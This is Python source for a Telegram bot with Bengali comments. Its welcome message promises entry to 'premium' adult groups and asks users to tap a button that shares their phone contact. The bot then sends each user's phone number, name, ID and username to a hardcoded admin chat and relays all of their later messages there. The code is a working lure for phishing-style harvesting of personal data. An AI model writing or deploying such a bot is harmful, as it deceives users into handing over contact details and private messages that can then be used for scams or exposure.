 import os
import logging
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- ⚠️ এইখানে আপনার নিজের Chat ID বসান ---
# @userinfobot থেকে পাওয়া আপনার ID টি " " এর ভেতরে বসান
ADMIN_CHAT_ID = "8317578721" 
# যেমন: ADMIN_CHAT_ID = "123456789"
# ------------------------------------------

BOT_TOKEN = os.environ.get("BOT_TOKEN")

# /start কমান্ড
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # ইউজারকে কন্টাক্ট বাটন পাঠানো
    contact_button = KeyboardButton(text="Click to Share Your Contact", request_contact=True)
    keyboard = [[contact_button]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    
    welcome_note = "♨️স্বাগতম! আমাদের প্রিমিয়াম গ্ৰুপের এক্সেস পেতে সকল পারমিশন দিন🈵 এবং সাথে সাথে আমাদের সকল গ্ৰুপের এক্সেস পান 🔞।"
    await update.message.reply_text(welcome_note, reply_markup=reply_markup)

# যখন ইউজার কন্টাক্ট শেয়ার করবে
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    contact = update.message.contact
    phone_number = contact.phone_number
    first_name = contact.first_name
    user_id = contact.user_id
    username = update.message.from_user.username or "N/A"
    
    # ⚠️ নম্বরটি মেমোরিতে সেভ করা হচ্ছে
    context.user_data['phone'] = phone_number
    context.user_data['name'] = first_name
    
    logger.info(f"Contact received from {first_name}. Phone: {phone_number}")
    
    # ইউজারকে ধন্যবাদ মেসেজ
    await update.message.reply_text(
        f"ধন্যবাদ {first_name}! আপনার নম্বর ({phone_number}) সেভ করা হয়েছে। এখন আপনি আপনার মেসেজ পাঠাতে পারেন।",
        reply_markup=ReplyKeyboardRemove() # বাটন সরিয়ে ফেলা
    )
    
    # অ্যাডমিনকে নোটিফিকেশন পাঠানো
    admin_message = f"""
    🔔 নতুন ইউজার কন্টাক্ট শেয়ার করেছে:
    
    নাম: {first_name}
    ফোন নম্বর: {phone_number}
    ইউজার আইডি: {user_id}
    ইউজারনেম: @{username}
    """
    if ADMIN_CHAT_ID:
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message)

# ⚠️ নতুন ফাংশন: সাধারণ টেক্সট মেসেজ হ্যান্ডেল করার জন্য
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_message = update.message.text
    user = update.message.from_user
    
    # চেক করা হচ্ছে যে এই ইউজারের নম্বরটি মেমোরিতে সেভ আছে কি না
    saved_phone = context.user_data.get('phone')
    saved_name = context.user_data.get('name', user.first_name)
    
    if saved_phone:
        # নম্বর সেভ থাকলে অ্যাডমিনের কাছে মেসেজ পাঠানো
        admin_forward_message = f"""
        📩 নতুন মেসেজ এসেছে:
        
        ইউজার: {saved_name}
        নম্বর: {saved_phone}
        ইউজার আইডি: {user.id}
        
        মেসেজ:
        {user_message}
        """
        if ADMIN_CHAT_ID:
            await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_forward_message)
        
        # (ঐচ্ছিক) ইউজারকে কনফার্মেশন পাঠানো
        await update.message.reply_text("আপনার মেসেজটি অ্যাডমিনের কাছে পাঠানো হয়েছে।")
        
    else:
        # যদি নম্বর সেভ না থাকে
        await update.message.reply_text("দয়া করে প্রথমে /start কমান্ডটি ব্যবহার করুন এবং আপনার কন্টাক্ট শেয়ার করুন।")

# মূল ফাংশন
def main() -> None:
    if not BOT_TOKEN:
        logger.error("Error: BOT_TOKEN is not set!")
        return
    if not ADMIN_CHAT_ID or ADMIN_CHAT_ID == "YOUR_CHAT_ID_HERE":
        logger.error("Error: ADMIN_CHAT_ID is not set!")
        return

    application = Application.builder().token(BOT_TOKEN).build()
    
    # হ্যান্ডলারগুলো যোগ করা
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message)) # সাধারণ মেসেজের জন্য
    
    logger.info("Bot is starting (Upgraded Version)...")
    application.run_polling()

if __name__ == "__main__":
    main()
